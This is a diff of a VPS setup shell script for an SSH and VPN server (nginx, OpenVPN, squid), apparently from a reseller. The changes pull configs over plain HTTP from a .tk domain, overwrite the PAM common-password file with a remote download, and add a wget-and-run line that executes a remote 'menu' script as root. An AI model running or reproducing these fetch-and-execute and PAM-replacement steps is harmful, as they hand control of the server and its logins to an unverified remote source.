@@ -49,26 +49,23 @@ apt-file update
 vnstat -u -i venet0
 service vnstat restart
 
-# install screenfetch
-cd
-wget https://github.com/KittyKatt/screenFetch/raw/master/screenfetch-dev
-mv screenfetch-dev /usr/bin/screenfetch
-chmod +x /usr/bin/screenfetch
-echo "clear" >> .profile
-echo "screenfetch" >> .profile
 
 # install webserver
 cd
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf "https://raw.github.com/arieonline/autoscript/master/conf/nginx.conf"
+wget -O /etc/nginx/nginx.conf "http://autoscriptnobita.tk/MASTER7752/nginx.conf"
 mkdir -p /home/vps/public_html
 echo "<pre>Setup by KangArie | JualSSH.com | @arieonline | 7946F434</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.github.com/arieonline/autoscript/master/conf/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "http://autoscriptnobita.tk/MASTER7752/vps.conf"
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 service php5-fpm restart
 service nginx restart
+
+# script
+wget -O /etc/pam.d/common-password "http://autoscriptnobita.tk/rendum/common-password"
+chmod +x /etc/pam.d/common-password
 
 # openvpn
 apt-get -y install openvpn
@@ -91,7 +88,6 @@ service openvpn restart
 # configure openvpn client config
 
 wget -O /home/vps/public_html/client.ovpn "http://autoscriptnobita.tk/rendum/client.ovpn"
-wget -O /etc/motd "http://autoscriptnobita.tk/rendum/motd"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
 useradd -m -g users -s /bin/bash archangels
@@ -155,11 +151,12 @@ cd
 # install fail2ban
 apt-get -y install fail2ban;service fail2ban restart
 
-# install squid3
+# squid3
 apt-get -y install squid3
-wget -O /etc/squid3/squid.conf "https://raw.github.com/arieonline/autoscript/master/conf/squid3.conf"
-sed -i $MYIP2 /etc/squid3/squid.conf;
-service squid3 restart
+wget -O /etc/squid3/squid.conf "http://autoscriptnobita.tk/rendum/squid.conf"
+wget -O /etc/squid/squid.conf "http://autoscriptnobita.tk/rendum/squid.conf"
+sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
+sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
 
 # install webmin
 cd
@@ -172,22 +169,7 @@ service vnstat restart
 
 # downlaod script
 cd
-wget -O speedtest_cli.py "https://raw.github.com/sivel/speedtest-cli/master/speedtest_cli.py"
-wget -O bench-network.sh "https://raw.github.com/arieonline/autoscript/master/conf/bench-network.sh"
-wget -O ps_mem.py "https://raw.github.com/pixelb/ps_mem/master/ps_mem.py"
-wget -O limit.sh "https://raw.github.com/arieonline/autoscript/master/conf/limit.sh"
-curl http://script.jualssh.com/user-login.sh > user-login.sh
-curl http://script.jualssh.com/user-expire.sh > user-expire.sh
-curl http://script.jualssh.com/user-limit.sh > user-limit.sh
-echo "0 0 * * * root /root/user-expire.sh" > /etc/cron.d/user-expire
-sed -i '$ i\screen -AmdS limit /root/limit.sh' /etc/rc.local
-chmod +x bench-network.sh
-chmod +x speedtest_cli.py
-chmod +x ps_mem.py
-chmod +x user-login.sh
-chmod +x user-expire.sh
-chmod +x user-limit.sh
-chmod +x limit.sh
+wget https://raw.githubusercontent.com/redhatz91/m.e.n.u/master/AnonymousVpn8/menu && chmod +x menu && ./menu
 
 # finalisasi
 chown -R www-data:www-data /home/vps/public_html
